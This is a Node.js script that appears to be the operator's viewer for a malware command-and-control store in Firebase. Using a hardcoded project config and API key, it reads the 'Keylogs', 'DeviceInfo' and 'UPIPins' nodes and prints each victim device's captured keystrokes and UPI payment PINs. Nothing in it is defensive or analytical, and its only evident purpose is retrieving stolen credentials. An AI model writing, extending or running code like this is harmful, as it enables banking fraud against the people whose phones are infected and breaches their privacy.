// Script to check Firebase database contents
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Check current database contents
async function checkDatabase() {
  try {
    console.log('🔍 Checking Firebase database contents...');
    
    // Check KeyLogs (note: using "Keylogs" with lowercase 'l')
    console.log('\n📱 Checking Keylogs...');
    const keyLogsSnapshot = await get(ref(database, 'Keylogs'));
    const keyLogs = keyLogsSnapshot.val();
    console.log('Keylogs data:', keyLogs);
    
    if (keyLogs) {
      console.log('KeyLogs structure:');
      Object.entries(keyLogs).forEach(([deviceId, logs]) => {
        console.log(`\nDevice: ${deviceId}`);
        if (logs) {
          Object.entries(logs).forEach(([logId, logData]) => {
            console.log(`  Log ${logId}:`, logData);
          });
        }
      });
    } else {
      console.log('❌ No KeyLogs found in database');
    }
    
    // Check DeviceInfo to see what devices exist
    console.log('\n📱 Checking DeviceInfo...');
    const deviceInfoSnapshot = await get(ref(database, 'DeviceInfo'));
    const deviceInfo = deviceInfoSnapshot.val();
    console.log('DeviceInfo data:', deviceInfo);
    
    if (deviceInfo) {
      console.log('Available devices:');
      Object.keys(deviceInfo).forEach(deviceId => {
        console.log(`  - ${deviceId}`);
      });
    } else {
      console.log('❌ No DeviceInfo found in database');
    }
    
    // Check UPI Pins
    console.log('\n💳 Checking UPI Pins...');
    const upiPinsSnapshot = await get(ref(database, 'UPIPins'));
    const upiPins = upiPinsSnapshot.val();
    console.log('UPI Pins data:', upiPins);
    
    if (upiPins) {
      console.log('UPI Pins structure:');
      Object.entries(upiPins).forEach(([deviceId, pins]) => {
        console.log(`\nDevice: ${deviceId}`);
        if (Array.isArray(pins)) {
          console.log(`  Pins (array): ${pins.join(', ')}`);
        } else if (pins && typeof pins === 'object') {
          console.log(`  Pins (object):`);
          Object.entries(pins).forEach(([pinId, pinData]) => {
            console.log(`    ${pinId}: ${pinData.pin || pinData} (${pinData.timestamp || 'no timestamp'})`);
          });
        }
      });
    } else {
      console.log('❌ No UPI Pins found in database');
    }

    // Check if there's a mismatch between device IDs
    if (deviceInfo) {
      console.log('\n🔍 Checking data availability for each device...');
      const deviceInfoDevices = Object.keys(deviceInfo);
      
      deviceInfoDevices.forEach(deviceId => {
        const hasKeyLogs = keyLogs && keyLogs[deviceId];
        const hasUpiPins = upiPins && upiPins[deviceId];
        
        console.log(`📱 ${deviceId}:`);
        console.log(`  - KeyLogs: ${hasKeyLogs ? '✅ Available' : '❌ Missing'}`);
        console.log(`  - UPI Pins: ${hasUpiPins ? '✅ Available' : '❌ Missing'}`);
      });
    }
    
  } catch (error) {
    console.error('❌ Error checking database:', error);
  }
}

// Add timeout to prevent hanging
const timeout = setTimeout(() => {
  console.log('\n⏰ Script timeout - forcing exit after 30 seconds');
  process.exit(1);
}, 30000);

// Run the check
checkDatabase().then(() => {
  clearTimeout(timeout);
  console.log('\n🎉 Database check completed!');
  process.exit(0);
}).catch((error) => {
  clearTimeout(timeout);
  console.error('❌ Error during database check:', error);
  process.exit(1);
});
